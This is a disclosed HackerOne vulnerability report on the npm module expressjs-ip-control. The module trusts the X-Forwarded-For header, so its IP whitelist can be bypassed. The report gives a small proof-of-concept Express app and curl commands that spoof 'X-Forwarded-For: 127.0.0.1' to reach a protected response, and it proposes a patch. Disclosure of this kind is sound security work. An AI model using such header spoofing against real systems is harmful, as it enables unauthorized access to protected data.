# [expressjs-ip-control] Whitelist IP bypass leads to authorization bypass and sensitive info disclosure

## Report Details
- **Report ID**: 693788
- **URL**: https://hackerone.com/reports/693788
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2019-09-12T15:55:04.541Z
- **Disclosed**: 2020-10-29T19:27:29.116Z

## Reporter
- **Username**: mik317
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: nodejs-ecosystem

## Vulnerability Information
I would like to report a `unauthenticated access/authorization bypass` issue in the `expressjs-ip-control` module.
It allows to `bypass` the `whitelist IP check` in order to bypass the `authorization check` and possibly `expose sensitive datas`.

# Module
**module name:** [MODULE NAME]
**version:** [MODULE VERSION]
**npm page:** `https://www.npmjs.com/package/[MODULE NAME]`

## Module Description
> Expressjs package to whitelist IP addresses also support for x-forwarded-for ip addresses.

## Module Stats
[`N/A`] downloads in the last day
[`17`] downloads in the last week
[`~250`] downloads in the last month

## Vulnerability Description
The issue arises because the module checks if is present in the request a `X-Forwarded-For` header, and bases the authorization on that check ... as we know, that header can be simply manipulated, in order to `bypass` the protection, leading to `sensitive information disclosure`.

## Steps To Reproduce:
1. Install the module: `npm i expressjs-ip-control`
2. Create a PoC file like this:

```js
// poc.js
const express = require('express')
const app = express()
const ipControl = require('expressjs-ip-control')
 
app.get('/', ipControl({
    whitelist: '127.0.0.1, 192.168.10.10',
}), (req, res) => res.send('SECRET TOKEN ACCESSIBLE ONLY BY LOCAL PC'))

app.listen(3000)
```
3. Run the PoC: `node poc.js`
4. Now, test the `whitelist` protection with this commands: 

```bash
curl 'http://localhost:3000/' # Obtain *403* response --> *You do not have rights to visit this page*
curl 'http://localhost:3000/' -H 'X-Forwarded-For: 127.0.0.1' # Obtain *200* response --> secret token
```
{F581254}

## Patch
> Don't check for the `x-forwarded-for` header, has it can be changed leading to `IP whitelist` bypass

## Supporting Material/References:
- [OPERATING SYSTEM VERSION]: Kali Linux
- [NODEJS VERSION]: 10.16.3
- [NPM VERSION]: 6.0.9

# Wrap up
- I contacted the maintainer to let them know: [N] 
- I opened an issue in the related repository: [N] 

I'm not sure you'll consider this issue valid, as the `x-forwarded-for` header support, is a feature of the library. However, this "feature" leads to the issue I've described. If you won't consider this valid, pls be clement and also, can I know if you consider valid the same issue applied to a `blacklist` module? (in that case, it could allow attackers blacklisted to change IP without change PC and so continue DOS/spam the server :))

## Impact

`Whitelist IP bypass`, leading to`Authorization issue` on `expressjs-ip-control`, may lead to `sensitive information disclosure`

## Attachments
- Screenshot_from_2019-09-12_15-36-06.png
